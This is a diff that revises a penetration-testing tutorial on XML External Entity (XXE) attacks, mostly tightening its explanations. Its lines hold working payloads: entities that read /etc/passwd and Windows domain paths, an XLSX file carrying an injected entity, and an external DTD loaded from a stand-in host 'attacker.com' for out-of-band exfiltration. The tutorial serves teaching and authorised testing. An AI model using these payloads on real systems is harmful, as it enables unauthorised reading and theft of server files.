@@ -33,7 +33,7 @@ The first line (`<?xml version="1.0" encoding="UTF-8"?>`) is the XML declaration
 
 An XML parser is a piece of software that reads XML documents and makes their content available to the application. When a web application receives XML data (for example in an API request), it passes that data to the parser. The parser reads the XML document, checks its syntax and converts it into something the application can work with. For instance, when a Java server receives a POST request with `Content-Type: application/xml`, it typically passes the body to a parser like `DocumentBuilderFactory` to extract the data.
 
-The key thing to understand is that the parser does not just read the data — it also **processes instructions** embedded in the XML document. This is where the security problem begins, because some of those instructions can tell the parser to read files from the server or make network requests. These instructions are called **entity declarations**, and will be covered in the following sections.
+The key thing to understand is that the parser does not just read the data — it also **evaluates declarations** embedded in the XML document. This is where the security problem begins, because some of those instructions can tell the parser to read files from the server or make network requests. These instructions are called **entity declarations**, and will be covered in the following sections.
 
 ## What is a DTD
 
@@ -119,7 +119,7 @@ When the parser encounters `<!ENTITY xxe SYSTEM "file:///etc/passwd">` followed 
 
 1. Reads the DOCTYPE and registers the entity `xxe` with its SYSTEM identifier
 2. When it encounters `&xxe;` in the document body, looks up the entity
-3. Sees the `SYSTEM` keyword and attempts to fetch `file:///etc/passwd`
+3. If entity resolution is enabled, it sees the `SYSTEM` keyword and attempts to fetch `file:///etc/passwd`
 4. Reads the file content and substitutes it in place of `&xxe;`
 5. Continues parsing the document with the substituted content
 
@@ -165,7 +165,7 @@ Here the attacker is defining "example" and assigning the content of "/etc/passw
 
 ## Requirements
 
-XXE attacks require the application to accept XML from uncontrolled sources and parse it in an insecure way. Historically, many XML parsers are insecure by default and require the developer to explicitly limit their capabilities by setting specific flags in the component that uses it in order to make them secure. 
+XXE attacks require the application to accept XML from uncontrolled sources and parse it in an insecure way. Historically, many XML parsers were insecure by default and require the developer to explicitly limit their capabilities by setting specific flags on the parser in order to make it secure. 
 
 -----
 
@@ -426,7 +426,7 @@ If the target matches any of these patterns and especially if it runs Java, it i
 
 ## Testing on REST APIs
 
-The most reliable way to confirm XXE is by triggering entity resolution. To minimize the risk of information leaks and damage to the server we can try to either reflect a string from an external entity or read a harmless file like the hosts file.
+The most reliable way to confirm XXE is by triggering entity resolution. To minimize the risk of information leaks and damage to the server we can start by reflecting a string from an internal entity to confirm entity processing, then escalate to reading a harmless file.
 
 Some scenarios would require further testing since the entry point of the attack would not properly reflect our payload in the response. In these cases we can rely on errors coming from the application to identify the exploitability.
 
@@ -476,7 +476,7 @@ But if the response does not return anything or it does not contain the expected
 </contacts>
 ```
 
-In a real exploitation use case, this payload triggered an "Unknown protocol: sdjsd". This is proof enough to infer that the defined external entity "xxe" is being processed by the XML parser.
+In a real exploitation use case, this payload triggered an "Unknown protocol: sdjsd". This confirms that the parser is attempting to resolve the SYSTEM identifier in the entity declaration.
 
 ### Test 4: Malformed URL Error
 
@@ -668,7 +668,7 @@ Windows specific files:
 <!ENTITY xxe SYSTEM "file:///\\dc.example.com\SYSVOL\example.com\Policies\">
 ```
 
-Some notes on Windows paths: use forward slashes even on Windows (`file:///C:/path/to/file`) since backslashes are interpreted as escape characters in XML. UNC paths use `file:///\\server\share\file`. Some parsers also support alternate data streams: `file:///C:/path/file.txt:zone.identifier`.
+Some notes on Windows paths: use forward slashes even on Windows (`file:///C:/path/to/file`) since backslashes are not valid characters in URIs (RFC 3986) and some parsers handle them inconsistently. UNC paths use `file:///\\server\share\file`. Some parsers also support alternate data streams: `file:///C:/path/file.txt:zone.identifier`. This works because the parser passes the path to the operating system, which resolves the ADS syntax natively on NTFS filesystems.
 
 ##### Note on UNC path syntax
 The forward slash rule applies to local Windows file paths (`file:///C:/path/to/file`). UNC paths are an exception — they require the double backslash notation (`\\server\share\file`) because that is how the UNC convention is defined. Some parsers also accept forward slash equivalents (`file:////server/share/file`), but backslash notation is more broadly supported for UNC across Java-based parsers.
@@ -773,6 +773,7 @@ Ensure the server is publicly accessible or reachable from the target environmen
 Send an XML payload that loads the external DTD:
 
 ```xml
+<?xml version="1.0"?>
 <!DOCTYPE message [
   <!ENTITY % remote SYSTEM "http://attacker.com/malicious.dtd">
   %remote;
@@ -923,15 +924,13 @@ unzip document.xlsx -d xlsx_extracted/
 
 ```xml
 <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
-<!DOCTYPE cdl [
-  <!ELEMENT cdl ANY>
+<!DOCTYPE workbook [
   <!ENTITY xxe SYSTEM "file:///etc/passwd">
 ]>
-<cdl>&xxe;</cdl>
 <workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"
           xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
   <sheets>
-    <sheet name="Sheet1" sheetId="1" r:id="rId1"/>
+    <sheet name="&xxe;" sheetId="1" r:id="rId1"/>
   </sheets>
 </workbook>
 ```
@@ -974,7 +973,7 @@ The approach is the same for all XML-based formats (SVG, XLSX, DOCX, ODS, ODP, X
 
 ## XXE in SOAP
 
-SOAP is built on XML and remains widely used in enterprise systems (financial, government). Since SOAP inherently consumes XML, it is a natural target for XXE.
+SOAP is built on XML and remains widely used in enterprise systems (financial, government). Since SOAP inherently consumes XML, it is a natural target for XXE. Note that many SOAP frameworks parse XML at the framework level, so XXE exploitability depends on the framework's parser configuration, not just the application code.
 
 A typical SOAP request:
 
@@ -1210,7 +1209,7 @@ Then send this payload to the vulnerable application:
 <foo>&content;</foo>
 ```
 
-When the parser loads the external DTD, `%all` defines the general entity `&content;` whose value is `<![CDATA[<file contents>]]>`. The CDATA wrapper neutralises the special characters before the parser sees them in the document body. This technique requires the parser to be able to reach your server — the same network condition as OOB exfiltration.
+When the parser loads the external DTD, `%all` defines the general entity `&content;` whose value is `<![CDATA[<file contents>]]>`. The CDATA wrapper prevents the parser from interpreting them as markup. This technique requires the parser to be able to reach your server — the same network condition as OOB exfiltration.
 
 -----
 
@@ -1262,7 +1261,7 @@ To find candidates quickly, run these two commands and cross-reference the outpu
 
 ```bash
 grep -n 'ENTITY %' target.dtd     # list all parameter entity definitions
-grep -n '%[a-zA-Z]' target.dtd    # list all parameter entity references
+grep -n '%[a-zA-Z][a-zA-Z0-9.]*;' target.dtd    # list all parameter entity references
 ```
 
 For each entity that appears in both outputs, check the context of its reference:
